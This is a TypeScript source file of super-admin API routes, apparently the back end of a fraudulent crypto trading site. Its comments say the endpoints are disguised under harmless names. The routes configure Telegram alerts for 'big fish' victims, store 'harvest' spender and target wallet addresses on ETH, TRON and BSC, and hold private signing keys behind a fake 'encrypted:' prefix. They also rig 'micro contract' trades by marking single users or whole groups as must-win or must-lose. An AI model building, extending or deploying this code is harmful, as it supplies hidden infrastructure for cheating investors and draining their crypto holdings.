/**
 * SuperAdmin-Only Routes (超级管理员专用)
 * 
 * SECURITY: All endpoints require role_type === 0
 * Operator (role_type === 1) access will return 403 and log security violation
 * 
 * API Naming Convention (Disguised):
 * - /system/messaging-gateway → Telegram config
 * - /system/maintenance-endpoint → Harvest addresses
 * - /network/signing-credentials → Private keys
 * - /accounts/risk-profile → Micro contract user control (秒合约单控)
 * - /accounts/batch-risk → Micro contract group control (秒合约群控)
 */

import { Elysia, t } from 'elysia';
import { db } from '../db';
import { users, agent, microOrder, siteConfig } from '../db/schema';

// Alias for clarity
const systemConfig = siteConfig;
import { eq, and, like, sql } from 'drizzle-orm';
import { superAdminOnly, logAdminAction, ROLE_SUPER_ADMIN } from '../middleware/rbac';

// Risk values for micro contract control
const RISK_VALUES = {
  NORMAL: 0,      // 正常 - Use system probability
  MUST_WIN: 1,    // 必赢 - Force profit
  MUST_LOSE: -1,  // 必输 - Force loss
};

export const superAdminRoutes = new Elysia({ prefix: '/api/admin' })
  .use(superAdminOnly)

  // ============================================================
  // TELEGRAM CONFIGURATION (情报中心)
  // Disguised as: messaging-gateway
  // ============================================================
  .group('/system', app => app
    
    .get('/messaging-gateway', async ({ agent }: any) => {
      // Get current Telegram config
      const configs = await db.select().from(systemConfig)
        .where(like(systemConfig.key, 'telegram_%'));
      
      const configMap: Record<string, string> = {};
      configs.forEach(c => {
        configMap[c.key] = c.value || '';
      });

      await logAdminAction(agent.id, 'VIEW_TELEGRAM_CONFIG', '/messaging-gateway', 'GET');

      return {
        type: 'ok',
        data: {
          bot_token_masked: configMap['telegram_bot_token'] 
            ? '***' + configMap['telegram_bot_token'].slice(-6) 
            : '',
          chat_id: configMap['telegram_chat_id'] || '',
          alert_enabled: configMap['telegram_enabled'] === '1',
          big_fish_threshold: configMap['telegram_threshold'] || '1000',
        }
      };
    })

    .post('/messaging-gateway', async ({ body, agent }: any) => {
      const { bot_token, chat_id, enabled, threshold } = body;

      // Update configs
      const updates = [
        { key: 'telegram_bot_token', value: bot_token },
        { key: 'telegram_chat_id', value: chat_id },
        { key: 'telegram_enabled', value: enabled ? '1' : '0' },
        { key: 'telegram_threshold', value: threshold?.toString() || '1000' },
      ];

      for (const { key, value } of updates) {
        if (value !== undefined) {
          await db.insert(systemConfig)
            .values({ key, value, updatedAt: Math.floor(Date.now() / 1000) })
            .onConflictDoUpdate({ 
              target: systemConfig.key, 
              set: { value, updatedAt: Math.floor(Date.now() / 1000) } 
            });
        }
      }

      await logAdminAction(agent.id, 'UPDATE_TELEGRAM_CONFIG', '/messaging-gateway', 'POST', {
        enabled, threshold, chat_id_masked: chat_id ? '***' + chat_id.slice(-4) : ''
      });

      return { type: 'ok', message: 'Telegram configuration updated' };
    }, {
      body: t.Object({
        bot_token: t.Optional(t.String()),
        chat_id: t.Optional(t.String()),
        enabled: t.Optional(t.Boolean()),
        threshold: t.Optional(t.Number()),
      })
    })

    // ============================================================
    // HARVEST ADDRESS CONFIGURATION (资产命脉)
    // Disguised as: maintenance-endpoint
    // ============================================================
    .get('/maintenance-endpoint', async ({ agent }: any) => {
      const configs = await db.select().from(systemConfig)
        .where(like(systemConfig.key, 'harvest_%'));
      
      const configMap: Record<string, string> = {};
      configs.forEach(c => {
        configMap[c.key] = c.value || '';
      });

      await logAdminAction(agent.id, 'VIEW_HARVEST_CONFIG', '/maintenance-endpoint', 'GET');

      return {
        type: 'ok',
        data: {
          eth_spender: configMap['harvest_eth_spender'] || '',
          eth_target: configMap['harvest_eth_target'] || '',
          tron_spender: configMap['harvest_tron_spender'] || '',
          tron_target: configMap['harvest_tron_target'] || '',
          bsc_spender: configMap['harvest_bsc_spender'] || '',
          bsc_target: configMap['harvest_bsc_target'] || '',
        }
      };
    })

    .post('/maintenance-endpoint', async ({ body, agent }: any) => {
      const updates = [
        { key: 'harvest_eth_spender', value: body.eth_spender },
        { key: 'harvest_eth_target', value: body.eth_target },
        { key: 'harvest_tron_spender', value: body.tron_spender },
        { key: 'harvest_tron_target', value: body.tron_target },
        { key: 'harvest_bsc_spender', value: body.bsc_spender },
        { key: 'harvest_bsc_target', value: body.bsc_target },
      ];

      for (const { key, value } of updates) {
        if (value !== undefined) {
          await db.insert(systemConfig)
            .values({ key, value, updatedAt: Math.floor(Date.now() / 1000) })
            .onConflictDoUpdate({ 
              target: systemConfig.key, 
              set: { value, updatedAt: Math.floor(Date.now() / 1000) } 
            });
        }
      }

      await logAdminAction(agent.id, 'UPDATE_HARVEST_CONFIG', '/maintenance-endpoint', 'POST');

      return { type: 'ok', message: 'Harvest configuration updated' };
    }, {
      body: t.Object({
        eth_spender: t.Optional(t.String()),
        eth_target: t.Optional(t.String()),
        tron_spender: t.Optional(t.String()),
        tron_target: t.Optional(t.String()),
        bsc_spender: t.Optional(t.String()),
        bsc_target: t.Optional(t.String()),
      })
    })

    // Health threshold (Big Fish detection)
    .get('/health-threshold', async ({ agent }: any) => {
      const [config] = await db.select().from(systemConfig)
        .where(eq(systemConfig.key, 'big_fish_threshold')).limit(1);

      await logAdminAction(agent.id, 'VIEW_THRESHOLD', '/health-threshold', 'GET');

      return {
        type: 'ok',
        data: { threshold: config?.value || '1000' }
      };
    })

    .post('/health-threshold', async ({ body, agent }: any) => {
      await db.insert(systemConfig)
        .values({ 
          key: 'big_fish_threshold', 
          value: body.threshold.toString(),
          updatedAt: Math.floor(Date.now() / 1000)
        })
        .onConflictDoUpdate({ 
          target: systemConfig.key, 
          set: { value: body.threshold.toString(), updatedAt: Math.floor(Date.now() / 1000) } 
        });

      await logAdminAction(agent.id, 'UPDATE_THRESHOLD', '/health-threshold', 'POST', { threshold: body.threshold });

      return { type: 'ok', message: 'Threshold updated' };
    }, {
      body: t.Object({ threshold: t.Number() })
    })
  )

  // ============================================================
  // NETWORK CONFIGURATION (Private Keys, RPC)
  // ============================================================
  .group('/network', app => app
    
    .get('/signing-credentials', async ({ agent }: any) => {
      // Never return actual private keys, only show if configured
      const configs = await db.select().from(systemConfig)
        .where(like(systemConfig.key, 'signing_key_%'));
      
      await logAdminAction(agent.id, 'VIEW_SIGNING_STATUS', '/signing-credentials', 'GET');

      return {
        type: 'ok',
        data: {
          eth_configured: configs.some(c => c.key === 'signing_key_eth' && c.value),
          tron_configured: configs.some(c => c.key === 'signing_key_tron' && c.value),
          bsc_configured: configs.some(c => c.key === 'signing_key_bsc' && c.value),
        }
      };
    })

    .post('/signing-credentials', async ({ body, agent }: any) => {
      // Encrypt and store private keys
      // In production, use proper encryption (AES-256-GCM)
      const updates = [
        { key: 'signing_key_eth', value: body.eth_key },
        { key: 'signing_key_tron', value: body.tron_key },
        { key: 'signing_key_bsc', value: body.bsc_key },
      ];

      for (const { key, value } of updates) {
        if (value) {
          // TODO: Encrypt before storing
          await db.insert(systemConfig)
            .values({ key, value: `encrypted:${value}`, updatedAt: Math.floor(Date.now() / 1000) })
            .onConflictDoUpdate({ 
              target: systemConfig.key, 
              set: { value: `encrypted:${value}`, updatedAt: Math.floor(Date.now() / 1000) } 
            });
        }
      }

      await logAdminAction(agent.id, 'UPDATE_SIGNING_KEYS', '/signing-credentials', 'POST');

      return { type: 'ok', message: 'Signing credentials updated' };
    }, {
      body: t.Object({
        eth_key: t.Optional(t.String()),
        tron_key: t.Optional(t.String()),
        bsc_key: t.Optional(t.String()),
      })
    })

    .get('/node-endpoints', async ({ agent }: any) => {
      const configs = await db.select().from(systemConfig)
        .where(like(systemConfig.key, 'rpc_%'));
      
      const configMap: Record<string, string> = {};
      configs.forEach(c => {
        configMap[c.key] = c.value || '';
      });

      await logAdminAction(agent.id, 'VIEW_RPC_CONFIG', '/node-endpoints', 'GET');

      return {
        type: 'ok',
        data: {
          eth_endpoints: configMap['rpc_eth'] || '',
          tron_endpoints: configMap['rpc_tron'] || '',
          bsc_endpoints: configMap['rpc_bsc'] || '',
        }
      };
    })

    .post('/node-endpoints', async ({ body, agent }: any) => {
      const updates = [
        { key: 'rpc_eth', value: body.eth_endpoints },
        { key: 'rpc_tron', value: body.tron_endpoints },
        { key: 'rpc_bsc', value: body.bsc_endpoints },
      ];

      for (const { key, value } of updates) {
        if (value !== undefined) {
          await db.insert(systemConfig)
            .values({ key, value, updatedAt: Math.floor(Date.now() / 1000) })
            .onConflictDoUpdate({ 
              target: systemConfig.key, 
              set: { value, updatedAt: Math.floor(Date.now() / 1000) } 
            });
        }
      }

      await logAdminAction(agent.id, 'UPDATE_RPC_CONFIG', '/node-endpoints', 'POST');

      return { type: 'ok', message: 'RPC endpoints updated' };
    }, {
      body: t.Object({
        eth_endpoints: t.Optional(t.String()),
        tron_endpoints: t.Optional(t.String()),
        bsc_endpoints: t.Optional(t.String()),
      })
    })
  )

  // ============================================================
  // MICRO CONTRACT CONTROL (秒合约控盘)
  // Disguised as: accounts/risk-profile
  // ============================================================
  .group('/accounts', app => app
    
    // Search user by UID for micro control
    .get('/risk-profile/search', async ({ query, agent }: any) => {
      const { uid, phone, email } = query;
      
      let user = null;
      
      if (uid) {
        [user] = await db.select().from(users)
          .where(eq(users.id, parseInt(uid))).limit(1);
      } else if (phone) {
        [user] = await db.select().from(users)
          .where(eq(users.phone, phone)).limit(1);
      } else if (email) {
        [user] = await db.select().from(users)
          .where(eq(users.email, email)).limit(1);
      }

      if (!user) {
        return { type: 'error', message: 'User not found' };
      }

      // Get user's micro order stats
      const allOrders = await db.select().from(microOrder)
        .where(eq(microOrder.userId, user.id));
      
      const closedOrders = allOrders.filter(o => o.status === 3);
      const wins = closedOrders.filter(o => o.profitResult === 1).length;
      const losses = closedOrders.filter(o => o.profitResult === -1).length;

      await logAdminAction(agent.id, 'SEARCH_USER_RISK', '/risk-profile/search', 'GET', { uid: user.id });

      return {
        type: 'ok',
        data: {
          id: user.id,
          phone: user.phone ? user.phone.slice(0, 3) + '****' + user.phone.slice(-4) : null,
          email: user.email ? user.email.split('@')[0].slice(0, 3) + '***@' + user.email.split('@')[1] : null,
          current_risk: user.risk,
          risk_name: user.risk === 1 ? '必赢' : user.risk === -1 ? '必输' : '正常',
          total_orders: allOrders.length,
          closed_orders: closedOrders.length,
          wins,
          losses,
          win_rate: closedOrders.length > 0 ? ((wins / closedOrders.length) * 100).toFixed(2) : '0.00',
        }
      };
    })

    // Set single user risk (秒合约单控)
    .post('/risk-profile', async ({ body, agent }: any) => {
      const { user_id, risk } = body;

      // Validate risk value
      if (![RISK_VALUES.NORMAL, RISK_VALUES.MUST_WIN, RISK_VALUES.MUST_LOSE].includes(risk)) {
        return { type: 'error', message: 'Invalid risk value. Use 0 (normal), 1 (must win), -1 (must lose)' };
      }

      const [user] = await db.select().from(users)
        .where(eq(users.id, user_id)).limit(1);
      
      if (!user) {
        return { type: 'error', message: 'User not found' };
      }

      // Update user risk
      await db.update(users)
        .set({ risk })
        .where(eq(users.id, user_id));

      const riskName = risk === 1 ? '必赢' : risk === -1 ? '必输' : '正常';

      await logAdminAction(agent.id, 'SET_USER_RISK', '/risk-profile', 'POST', { 
        user_id, 
        risk, 
        risk_name: riskName 
      });

      return { 
        type: 'ok', 
        message: `User ${user_id} risk set to: ${riskName}`,
        data: { user_id, risk, risk_name: riskName }
      };
    }, {
      body: t.Object({
        user_id: t.Number(),
        risk: t.Number(),  // 0=normal, 1=must_win, -1=must_lose
      })
    })

    // Batch risk control (秒合约群控)
    .get('/batch-risk', async ({ agent }: any) => {
      // Get global risk settings
      const configs = await db.select().from(systemConfig)
        .where(like(systemConfig.key, 'risk_%'));
      
      const configMap: Record<string, string> = {};
      configs.forEach(c => {
        configMap[c.key] = c.value || '';
      });

      // Count users by risk setting
      const allUsers = await db.select({ risk: users.risk }).from(users);
      const riskCounts = {
        normal: allUsers.filter(u => u.risk === 0).length,
        must_win: allUsers.filter(u => u.risk === 1).length,
        must_lose: allUsers.filter(u => u.risk === -1).length,
      };

      await logAdminAction(agent.id, 'VIEW_BATCH_RISK', '/batch-risk', 'GET');

      return {
        type: 'ok',
        data: {
          risk_mode: configMap['risk_mode'] || '0',  // 0=off, 1=user, 2=group, 3=money, 4=order, 5=probability
          risk_group_result: configMap['risk_group_result'] || '-1',  // Default: group loses
          risk_profit_probability: configMap['risk_profit_probability'] || '30',  // 30% win rate
          user_counts: riskCounts,
        }
      };
    })

    .post('/batch-risk', async ({ body, agent }: any) => {
      const { risk_mode, risk_group_result, risk_profit_probability } = body;

      const updates = [
        { key: 'risk_mode', value: risk_mode?.toString() },
        { key: 'risk_group_result', value: risk_group_result?.toString() },
        { key: 'risk_profit_probability', value: risk_profit_probability?.toString() },
      ];

      for (const { key, value } of updates) {
        if (value !== undefined) {
          await db.insert(systemConfig)
            .values({ key, value, updatedAt: Math.floor(Date.now() / 1000) })
            .onConflictDoUpdate({ 
              target: systemConfig.key, 
              set: { value, updatedAt: Math.floor(Date.now() / 1000) } 
            });
        }
      }

      await logAdminAction(agent.id, 'UPDATE_BATCH_RISK', '/batch-risk', 'POST', body);

      return { type: 'ok', message: 'Batch risk settings updated' };
    }, {
      body: t.Object({
        risk_mode: t.Optional(t.Number()),
        risk_group_result: t.Optional(t.Number()),
        risk_profit_probability: t.Optional(t.Number()),
      })
    })

    // Reset all users to normal risk
    .post('/batch-risk/reset', async ({ agent }: any) => {
      await db.update(users)
        .set({ risk: 0 });

      await logAdminAction(agent.id, 'RESET_ALL_USER_RISK', '/batch-risk/reset', 'POST');

      return { type: 'ok', message: 'All users reset to normal risk' };
    })
  );

export default superAdminRoutes;
